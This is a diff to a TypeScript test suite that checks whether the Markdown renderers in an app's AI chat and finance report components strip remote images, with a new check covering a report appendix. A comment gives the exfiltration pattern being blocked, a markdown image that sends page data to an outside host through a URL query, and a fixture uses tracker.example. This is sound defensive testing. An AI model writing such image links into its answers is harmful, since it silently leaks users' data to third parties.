@@ -2,7 +2,7 @@
 // 一句 `![](https://外站/p.gif?d=…)` 不用点击就能把页面上的数据带出去。
 import assert from "node:assert/strict";
 import { readdirSync, readFileSync, statSync } from "node:fs";
-import { join } from "node:path";
+import { basename, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import test from "node:test";
 import { createElement } from "react";
@@ -34,18 +34,25 @@ function openingTags(src: string): string[] {
 }
 
 test("每个 ReactMarkdown 都带上图片拦截", () => {
-  let n = 0;
+  const covered = new Map<string, number>();
   for (const f of tsxFiles(SRC)) {
     const src = readFileSync(f, "utf8");
     for (const tag of openingTags(src)) {
-      n++;
+      const file = basename(f);
+      covered.set(file, (covered.get(file) ?? 0) + 1);
       const direct = /components=\{(noRemoteImages|\{\s*\.\.\.noRemoteImages)/.test(tag);
       // ResearchReport 先拼一份 components（第一项就是 ...noRemoteImages）再传进来
       const viaLocal = /components=\{components\}/.test(tag) && /const components: Components = \{\s*\.\.\.noRemoteImages,/.test(src);
-      assert.ok(direct || viaLocal, `${f.slice(SRC.length)}：${tag.slice(0, 90)} 没带 noRemoteImages`);
+      const viaAppendix = /components=\{appendixComponents\}/.test(tag)
+        && /const appendixComponents = \{ \.\.\.components \};/.test(src)
+        && /const components: Components = \{\s*\.\.\.noRemoteImages,/.test(src);
+      assert.ok(direct || viaLocal || viaAppendix, `${f.slice(SRC.length)}：${tag.slice(0, 90)} 没带 noRemoteImages`);
     }
   }
-  assert.ok(n >= 11, `应找到全部渲染处，实际 ${n} 处`);
+  for (const file of ["AiMessages.tsx", "DebateReport.tsx", "DailyReview.tsx", "Intel.tsx", "Notes.tsx", "ReportAnswer.tsx"]) {
+    assert.ok(covered.has(file), `未检查 ${file} 的 Markdown 图片拦截`);
+  }
+  assert.equal(covered.get("ResearchReport.tsx"), 2, "正文与附录都必须经过拦截检查");
 });
 
 test("对话回答和报告问答渲染出来没有 <img>，只留说明文字", async () => {
@@ -55,6 +62,13 @@ test("对话回答和报告问答渲染出来没有 <img>，只留说明文字",
     assert.doesNotMatch(plain, /<img|tracker\.example/);
     assert.match(textOf(plain), /\[图片未加载：持仓\]/);
 
+    const { ResearchReport } = await r.load("/src/verticals/finance/components/ResearchReport.tsx");
+    const report = r.html(ResearchReport, { result: {
+      run_id: "image-safety", availability: "ready", report: TRACKER, appendix: TRACKER,
+    } });
+    assert.doesNotMatch(report, /<img|tracker\.example/);
+    assert.equal(textOf(report).split("[图片未加载：持仓]").length - 1, 2);
+
     const { ReportAnswer } = await r.load("/src/verticals/finance/components/ReportAnswer.tsx");
     const { MemoryRouter } = await r.load("react-router-dom");
     const answer = r.html(() => createElement(MemoryRouter, null, createElement(ReportAnswer, { content: TRACKER })), {});
@@ -62,3 +76,4 @@ test("对话回答和报告问答渲染出来没有 <img>，只留说明文字",
     assert.match(textOf(answer), /\[图片未加载：持仓\]/);
   });
 });
+
